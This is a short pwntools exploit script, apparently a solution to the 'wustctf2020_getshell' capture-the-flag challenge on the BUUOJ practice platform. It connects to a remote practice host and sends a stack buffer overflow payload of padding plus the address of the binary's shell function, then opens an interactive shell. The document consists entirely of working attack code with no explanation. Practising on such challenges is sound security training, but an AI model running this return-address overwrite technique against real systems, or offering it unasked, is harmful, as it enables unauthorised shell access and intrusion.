from pwn import*
elf=ELF('./wustctf2020_getshell')
#p=process('./wustctf2020_getshell')
p=remote('node4.buuoj.cn',28506)
shell=elf.sym['shell']

payload=b'a'*(0x18+4)+p32(shell)
p.sendline(payload)
p.interactive()